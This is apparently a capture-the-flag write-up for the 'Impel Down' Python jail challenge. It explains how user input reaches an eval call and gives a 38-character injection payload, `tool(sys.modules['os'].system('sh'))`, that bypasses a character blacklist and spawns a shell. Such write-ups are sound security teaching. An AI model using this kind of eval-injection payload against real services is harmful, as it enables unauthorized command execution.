## Impel Down – Misc Challenge

Impel Down is a python jail challenge, with no source provided.

It takes the form of a menu-based game, and the introduction lets you know that it's a pyjail challenge, limited to 38 characters and with an unspecified character blacklist (which, after completing the challenge and reading the source, we saw was `#+-_"`).

After playing around with it, we encountered the following behavior:

```
[day-1]
################## Work List ##################
  coworker        : Find Coworker For Escape
  tool            : Find Any Tool
  dig             : Go Deep~
  bomb            : make boooooooomb!!!
###############################################
tool asdfjkl
Traceback (most recent call last):
  File "/home/impel_down/Impel_Down.py", line 140, in <module>
    result = eval("your."+work+"()")
  File "<string>", line 1
    your.tool asdfjkl()
```

So, strings you enter starting with "tool" get passed through the line `eval("your."+your_input+"()")`.

The first thing we tried was something like `tool() + __import__("os").system("sh")`, which Impel Down lets us know fails the character blacklist in multiple ways.

After determining a bit about what was and wasn't in the blacklist (and working to stay under the 38 character limit), we ended up making that original approach work with `tool(sys.modules['os'].system('sh'))`, which successfully pops a shell.

Note that we got feedback about things like `sys` (but not `os`) being imported via exception messages.
